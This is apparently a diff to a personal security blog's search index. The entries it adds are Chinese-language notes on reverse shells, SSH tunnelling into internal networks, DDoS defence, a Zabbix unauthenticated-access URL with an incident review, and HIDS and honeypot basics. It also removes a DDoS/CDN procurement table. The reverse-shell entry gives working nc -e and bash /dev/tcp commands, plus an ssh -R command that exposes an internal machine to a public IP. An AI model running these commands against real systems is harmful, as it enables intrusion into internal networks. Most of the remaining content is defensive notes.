@@ -1,6 +1,117 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>内网刺探及穿透</title>
+    <url>/2020/04/15/nc/</url>
+    <content><![CDATA[<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>内网shell反弹的本质是与公网服务器建立连接，将公网服务器传输过来的命令执行，并将结果返回。</p>
+<p>比如命令注入，不需要知道机器的账号密码，直接反弹出来</p>
+<p>虽然公司内网的机器没有暴漏给公网，但公网可以执行命令在这台机器上。前提条件：内网机器可访问互联网。</p>
+<p>第一种——nc反弹shell</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">黑客机器：nc -lvp 8888</span><br><span class="line">公司内网机器：nc -e /bin/bash 公网IP 8888</span><br></pre></td></tr></table></figure>
+
+<p>第二种——base反弹shell</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">黑客机器：nc -l -p 8888 -vvv</span><br><span class="line">公司内网机器：bash -i &gt;&amp; /dev/tcp/云端IP/云端端口 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="SSH隧道端口转发，内网穿透"><a href="#SSH隧道端口转发，内网穿透" class="headerlink" title="SSH隧道端口转发，内网穿透"></a>SSH隧道端口转发，内网穿透</h3><p>SSH远程转发 -R参数，将公司内网的A机器SSH（默认22）端口映射到公网的机器2222端口上。实现在公网的机器上SSH本地的2222端口，远程控制内网的A机器。</p>
+<p>前提条件：<br>1、需要知道公司内网机器账号密码<br>2、内网机器可访问公网（可连接云端SSH端口）</p>
+<p>公司内网机器：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -nNT -o ServerAliveInterval=60 -R 127.0.0.1:2222:127.0.0.1:22 hacker@114.115.145.114 -i /home/.ssh/id_rsa_公钥</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/SSH-%E5%85%AC%E5%8F%B8%E7%94%B5%E8%84%91.png" alt="" title="内网机器执行命令"><br>外网云端机器：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -p 2222 rhlog@localhost</span><br></pre></td></tr></table></figure>
+<p><img src="/images/SSH-%E9%BB%91%E5%AE%A2%E7%AB%AF.png" alt="" title="黑客端执行命令"></p>
+<p>Tips：服务器访问互联网权限，不能轻易开。</p>
+<p>如果开了互联网权限，又限制了80/443端口，依然可以反弹shell和SSH隧道转发（将云端SSH端口改为80）<br>具体参考：<a href="http://avfisher.win/archives/tag/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F" title="安全小飞侠的窝">渗透测试技巧之内网穿透方式与思路总结</a></p>
+]]></content>
+      <categories>
+        <category>反弹shell</category>
+      </categories>
+      <tags>
+        <tag>nc</tag>
+        <tag>SSH内网穿透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>api</title>
+    <url>/2020/04/03/api/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>DDoS攻击</title>
+    <url>/2020/03/31/ddos/</url>
+    <content><![CDATA[<ul>
+<li><a href="http://www.xmanshield.com/ddosquestion/" title="玄门盾DDoS防御">DDOS问答</a></li>
+</ul>
+<h3 id="UDP攻击-将IDC的入口带宽塞满"><a href="#UDP攻击-将IDC的入口带宽塞满" class="headerlink" title="UDP攻击,将IDC的入口带宽塞满"></a>UDP攻击,将IDC的入口带宽塞满</h3><p>防御方法：<br>1、直接丢弃UDP流量，因为源IP随机伪造难以追查，但大多数业务IP并不提供UDP服务，直接丢弃UDP流量即可。<br>2、出口IP切换到另一个公网IP<br>3、如果攻击者比较执着，即使换了公网IP他也立刻更改攻击目标的话，最好的解决办法就是找运营商帮忙做流量清洗<br>4、推荐本地DDOS防护设备+运营商清洗服务/云清洗服务</p>
+<p>静态页面也不能抗D，但可以提高抗攻击能力<br>cdn只能加速网站静态资源，动态资源/API直接回源</p>
+<p>非网站web业务，无法接入WAF防护<br>非网站业务只支持四层负载均衡转发，不支持七层防护（如WAF和CC防护）<br>对于游戏业务和视频直播业务来说，基本是UDP协议开发的</p>
+<a id="more"></a>
+<h3 id="常识"><a href="#常识" class="headerlink" title="常识"></a>常识</h3><p>服务器的上行带宽，出方向。<br>服务器的下行带宽，入方向。因为服务器的下行基本不限的，客户端上传文件，对服务器的带宽基本没有影响，取决于客户端本身网络的带宽。</p>
+<p>QPS是服务系统1s内接收客户端请求的一个并发处理能力。并发每秒的请求次数</p>
+<p>每个页面平均大小10+KB<br>1000~1500QPS，带宽大概100Mbps<br>3000QPS，带宽大概200Mbps<br>5000QPS，带宽大概400Mbps</p>
+]]></content>
+      <categories>
+        <category>DDoS</category>
+      </categories>
+      <tags>
+        <tag>DDoS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>流量分析</title>
+    <url>/2020/03/31/liuliang/</url>
+    <content><![CDATA[<p>机房出口的流量检测分析，鉴别攻击流量。</p>
+<h3 id="实际情况"><a href="#实际情况" class="headerlink" title="实际情况"></a>实际情况</h3><p>检索流量日志，巨量的404、构造的请求，非正常请求流量</p>
+]]></content>
+      <categories>
+        <category>流量</category>
+      </categories>
+      <tags>
+        <tag>流量</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>zabbix漏洞</title>
+    <url>/2020/03/31/zabbix/</url>
+    <content><![CDATA[<h3 id="Zabbix（扎比克斯）"><a href="#Zabbix（扎比克斯）" class="headerlink" title="Zabbix（扎比克斯）"></a>Zabbix（扎比克斯）</h3><p>用来监控IDC服务器运行状态，告警<br>zabbix agent部署在所有服务器上，采集数据上报给master。zabbix的web界面是php，默认账号密码admin/zabbix<br>未授权访问漏洞：<br><a href="http://xxx/zabbix/zabbix.php?action=dashboard.view&amp;ddreset=1">http://xxx/zabbix/zabbix.php?action=dashboard.view&amp;ddreset=1</a><br>攻击者可绕过登陆页面直接访问仪表板页面，即匿名访问系统/网络环境数据</p>
+<h3 id="安全建议"><a href="#安全建议" class="headerlink" title="安全建议"></a>安全建议</h3><p>1、禁止Zabbix暴露在公网<br>2、zabbix的登录口令一定要复杂，立即修改默认口令或弱口令<br>3、zabbix的server和agent都不要以root启动，不要设置AllowRoot=1<br>4、禁止agent执行system.run，不要设置EnableRemoteCommands=1<br>5、经常打安全补丁，保持系统内核版本，Zabbix版本为最新</p>
+<h3 id="攻击事件回顾"><a href="#攻击事件回顾" class="headerlink" title="攻击事件回顾"></a>攻击事件回顾</h3><p>黑客通过测试环境一个后台登陆页面，通过修改XFF，绕过爆破限制得到管理员账号密码（test1/a123456）。然后在页面上传webshell探测内网，并利用默认口令（Admin/zabbix）成功登录测试环境Zabbix管理界面，该集群下约625个节点服务器。</p>
+<p>安全应急<br>1、测试环境开放公网，要经过安全测试<br>2、管理后台禁止开放公网，加强账号强度<br>3、测试/开发环境未部署HIDS，入侵检测未告警<br>4、中间件弱口令、空口令、默认口令，引入安全鉴权机制</p>
+]]></content>
+      <categories>
+        <category>应急响应</category>
+      </categories>
+      <tags>
+        <tag>zabbix</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HIDS工作点</title>
+    <url>/2020/03/10/hids/</url>
+    <content><![CDATA[<h3 id="HIDS干啥用的"><a href="#HIDS干啥用的" class="headerlink" title="HIDS干啥用的"></a>HIDS干啥用的</h3><p>管理资产/脆弱性/主机状态/合规基线检测<br>webshell检测<br>弱口令检测<br>登录异常检测<br>反弹shell检测<br>后门检测<br>本地提权检测<br>挖矿、勒索检测<br>主机漏洞管理<br>开放端口检测</p>
+<p>恶意文件/程序/木马/病毒检测（特征+沙箱技术，在本地检测or传到服务端检测）</p>
+<h3 id="业界HIDS仅告警检测，处理动作无，不会拦截删除主机上的文件-病毒"><a href="#业界HIDS仅告警检测，处理动作无，不会拦截删除主机上的文件-病毒" class="headerlink" title="业界HIDS仅告警检测，处理动作无，不会拦截删除主机上的文件/病毒"></a>业界HIDS仅告警检测，处理动作无，不会拦截删除主机上的文件/病毒</h3>]]></content>
+      <categories>
+        <category>HIDS</category>
+      </categories>
+      <tags>
+        <tag>HIDS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>honey</title>
+    <url>/2020/03/05/honey/</url>
+    <content><![CDATA[<p>1、蜜罐是伪装欺骗+溯源的蜜罐平台，获取威胁情报<br>2、探针和蜜罐，探针对流量牵引到蜜罐。探针部署在某个网络，开放某个服务，检测响应把流量给蜜罐。<br>3、易受攻击的网段，放探针<br>4、探针身份被黑客发现<br>5、dmz选哪个类型，建议是web，如后台、登录页。但不建议有漏洞的<br>6、agent已被攻击，优先下线agent，免得内网泄露<br>7、办公内网探针是全端口监听，办公内网可选择有缺陷的蜜罐。<br>8、APP区的探针，开启全端口监听，伪装核心系统名称<br>9、403/404达到阈值，直接联动waf拦截。<br>10、HIDS或EDR可以记录终端的一些异常行为日志，蜜罐联动其他安全产品<br>11、探针是小程序/脚本，蜜罐是容器/虚拟机系统<br>12、探针不会对原服务器有大的资源消耗<br>13、蜜罐弄巧成拙，不建议有缺陷的蜜罐公布到公网<br>14、非护网期间，不建议对公网开放蜜罐</p>
+]]></content>
+      <categories>
+        <category>蜜罐</category>
+      </categories>
+      <tags>
+        <tag>蜜罐</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Nginx</title>
     <url>/2020/03/04/nginx/</url>
     <content><![CDATA[<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p><strong>启动nginx</strong>：<code>nginx</code><br><strong>关闭nginx</strong>：<code>nginx -s stop</code><br><strong>检测配置格式</strong>：<code>nginx -t</code><br><strong>重启nginx</strong>：<code>nginx -s reload</code></p>
@@ -53,250 +164,6 @@
       <tags>
         <tag>跨域</tag>
         <tag>CORS</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>技术招标</title>
-    <url>/2020/03/04/ddos/</url>
-    <content><![CDATA[<h3 id="UDP攻击-将IDC的入口带宽塞满"><a href="#UDP攻击-将IDC的入口带宽塞满" class="headerlink" title="UDP攻击,将IDC的入口带宽塞满"></a>UDP攻击,将IDC的入口带宽塞满</h3><p>防御方法：<br>1、直接丢弃UDP流量，因为源IP随机伪造难以追查，但大多数业务IP并不提供UDP服务，直接丢弃UDP流量即可。<br>2、出口IP切换到另一个公网IP<br>3、如果攻击者比较执着，即使换了公网IP他也立刻更改攻击目标的话，最好的解决办法就是找运营商帮忙做流量清洗</p>
-<p>静态页面也不能抗D<br>cdn只能加速网站静态资源，动态资源/API直接回源</p>
-<p>非网站web业务，无法接入WAF防护<br>非网站业务只支持四层负载均衡转发，不支持七层防护（如WAF和CC防护），也不支持黑白名单</p>
-<a id="more"></a>
-<h3 id="DDOS技术指标"><a href="#DDOS技术指标" class="headerlink" title="DDOS技术指标"></a>DDOS技术指标</h3><table>
-<thead>
-<tr>
-<th>序号</th>
-<th>类别</th>
-<th>指标内容</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>1</td>
-<td>功能指标</td>
-<td>支持HTTP/HTTPS/TCP/UDP协议接入，支持除80、443以外的特殊端口。</td>
-</tr>
-<tr>
-<td>2</td>
-<td>功能指标</td>
-<td>启用HTTPS防护时，支持证书可放置在我司机房，如keyless等。</td>
-</tr>
-<tr>
-<td>3</td>
-<td>功能指标</td>
-<td>支持多运营商网络防护线路，包括电信和联通、移动等。</td>
-</tr>
-<tr>
-<td>4</td>
-<td>功能指标</td>
-<td>支持多个IP负载均衡回源及域名回源模式。</td>
-</tr>
-<tr>
-<td>5</td>
-<td>功能指标</td>
-<td>传输层威胁防护：支持防护SYN flood攻击；ACK flood攻击；SYN-ACK flood攻击；FIN/RST flood攻击；TCP fragment flood攻击；UDP flood攻击；UDP fragment flood攻击；ICMP flood等。</td>
-</tr>
-<tr>
-<td>6</td>
-<td>功能指标</td>
-<td>应用型威胁防护：支持防护HTTP get /post flood 攻击；CC 攻击；HTTP slow header/post攻击；HTTPS flood攻击；SSL DoS/DDoS攻击；TCP连接耗尽攻击；Sockstress攻击；TCP重传攻击；TCP空连接攻击；SIP flood等。</td>
-</tr>
-<tr>
-<td>7</td>
-<td>功能指标</td>
-<td>CC防护正常、宽松、紧急、及自定义防护的配置。</td>
-</tr>
-<tr>
-<td>8</td>
-<td>功能指标</td>
-<td>安全防御扩展：快速弹性扩展云 WAF功能，保障网站应用安全，支持协同防御，可提供云端共同防御功能。</td>
-</tr>
-<tr>
-<td>9</td>
-<td>功能指标</td>
-<td>支持防护带宽动态扩容，在攻击流量（DDoS、CC等）较大时能够自动升级到100G甚至更高级别的防护，整个过程服务无中断。</td>
-</tr>
-<tr>
-<td>10</td>
-<td>功能指标</td>
-<td>针对IP、域名、URL等可添加黑、白名单，可对单独目录限制IP访问范围。</td>
-</tr>
-<tr>
-<td>11</td>
-<td>功能指标</td>
-<td>提供实时精准的流量报表及攻击详情信息，至少包括：网络出入库流量趋势、攻击类型、攻击IP、攻击次数、攻击峰值等信息。</td>
-</tr>
-<tr>
-<td>12</td>
-<td>功能指标</td>
-<td>提供攻击告警、日志API接口，可实时同步到我司的大数据平台，支持全量功能的OpenAPI接入。</td>
-</tr>
-<tr>
-<td>13</td>
-<td>性能指标</td>
-<td>服务可用性（SLA）达到99.99%。</td>
-</tr>
-<tr>
-<td>14</td>
-<td>性能指标</td>
-<td>DDoS攻击保障清洗成功率达到99.99%。</td>
-</tr>
-<tr>
-<td>15</td>
-<td>性能指标</td>
-<td>流量带宽储备不低于1T，具备近源清洗大流量DDOS攻击的能力，近源清洗能力不小30Gbps。</td>
-</tr>
-<tr>
-<td>16</td>
-<td>性能指标</td>
-<td>应用层支持百万级QPS CC攻击防护能力。</td>
-</tr>
-<tr>
-<td>17</td>
-<td>售后服务</td>
-<td>7*24小时的故障快速解决能力，支持QQ、微信、邮箱、电话等通讯方式沟通。</td>
-</tr>
-<tr>
-<td>18</td>
-<td>售后服务</td>
-<td>在我方有重大促销等活动时，可提供全程应急服务及应急预案，通过远程或现场全程参与。</td>
-</tr>
-<tr>
-<td>19</td>
-<td>其他</td>
-<td>可提供其他对于DDoS防护有增强帮助的内容，或补充说明内容。</td>
-</tr>
-</tbody></table>
-<h3 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h3><table>
-<thead>
-<tr>
-<th>序号</th>
-<th>类别</th>
-<th>指标内容</th>
-<th>厂商应答内容</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>1</td>
-<td>功能指标</td>
-<td>支持HTTP/HTTPS/TCP/UDP协议接入，支持除80、443以外的特殊端口。</td>
-<td></td>
-</tr>
-<tr>
-<td>2</td>
-<td>功能指标</td>
-<td>启用HTTPS防护时，支持证书可放置在我司机房。</td>
-<td></td>
-</tr>
-<tr>
-<td>3</td>
-<td>功能指标</td>
-<td>支持多运营商网络防护线路，包括电信和联通、移动。</td>
-<td></td>
-</tr>
-<tr>
-<td>4</td>
-<td>功能指标</td>
-<td>支持多个IP负载均衡回源及域名回源模式。</td>
-<td></td>
-</tr>
-<tr>
-<td>5</td>
-<td>功能指标</td>
-<td>传输层威胁防护：支持防护SYN flood攻击；ACK flood攻击；SYN-ACK flood攻击；FIN/RST flood攻击；TCP fragment flood攻击；UDP flood攻击；UDP fragment flood攻击；ICMP flood等。</td>
-<td></td>
-</tr>
-<tr>
-<td>6</td>
-<td>功能指标</td>
-<td>应用型威胁防护：支持防护HTTP get /post flood 攻击；CC 攻击；HTTP slow header/post攻击；HTTPS flood攻击；SSL DoS/DDoS攻击；TCP连接耗尽攻击；Sockstress攻击；TCP重传攻击；TCP空连接攻击；SIP flood等。</td>
-<td></td>
-</tr>
-<tr>
-<td>7</td>
-<td>功能指标</td>
-<td>CC防护正常、宽松、紧急、及自定义防护的配置。</td>
-<td></td>
-</tr>
-<tr>
-<td>8</td>
-<td>功能指标</td>
-<td>支持防护带宽动态扩容，在攻击流量（DDoS、CC等）较大时能够自动升级到100G甚至更高级别的防护，整个过程服务无中断。</td>
-<td></td>
-</tr>
-<tr>
-<td>9</td>
-<td>功能指标</td>
-<td>针对IP、域名、URL等可添加黑、白名单，可针对特定目录开放给IP白名单访问。</td>
-<td></td>
-</tr>
-<tr>
-<td>10</td>
-<td>功能指标</td>
-<td>提供实时精准的流量报表及攻击详情信息，至少包括：网络出入库流量趋势、攻击类型、攻击IP、攻击次数、攻击峰值等信息。</td>
-<td></td>
-</tr>
-<tr>
-<td>11</td>
-<td>功能指标</td>
-<td>提供攻击告警、日志API接口，可实时同步到我司的大数据平台，支持全量功能的OpenAPI接入。</td>
-<td></td>
-</tr>
-<tr>
-<td>12</td>
-<td>性能指标</td>
-<td>服务可用性（SLA）达到99.99%。</td>
-<td></td>
-</tr>
-<tr>
-<td>13</td>
-<td>性能指标</td>
-<td>流量带宽储备不低于1T，具备近源清洗大流量DDOS攻击的能力，近源清洗能力不小30Gbps。</td>
-<td></td>
-</tr>
-<tr>
-<td>14</td>
-<td>性能指标</td>
-<td>应用层支持百万级qps cc攻击防护能力。</td>
-<td></td>
-</tr>
-<tr>
-<td>15</td>
-<td>性能指标</td>
-<td>DDoS攻击保障清洗成功率达到99.99%。</td>
-<td></td>
-</tr>
-<tr>
-<td>16</td>
-<td>性能指标</td>
-<td>DDoS攻击流量达到一定量时，在防护平台上可直接进行黑洞处理，而不能将攻击流量回源。</td>
-<td></td>
-</tr>
-<tr>
-<td>17</td>
-<td>售后服务</td>
-<td>7*24小时的故障快速解决能力，支持QQ、微信、邮箱、电话等通讯方式沟通。</td>
-<td></td>
-</tr>
-<tr>
-<td>18</td>
-<td>售后服务</td>
-<td>在我方有重大促销等活动时，可提供全程应急服务及应急预案，通过远程或现场全程参与。</td>
-<td></td>
-</tr>
-<tr>
-<td>19</td>
-<td>个性化方案</td>
-<td>贵司可提供其他的对于DDoS防护有增强帮助的内容，或补充内容。</td>
-<td></td>
-</tr>
-</tbody></table>
-]]></content>
-      <categories>
-        <category>DDOS</category>
-        <category>CDN</category>
-      </categories>
-      <tags>
-        <tag>技术招标</tag>
       </tags>
   </entry>
   <entry>
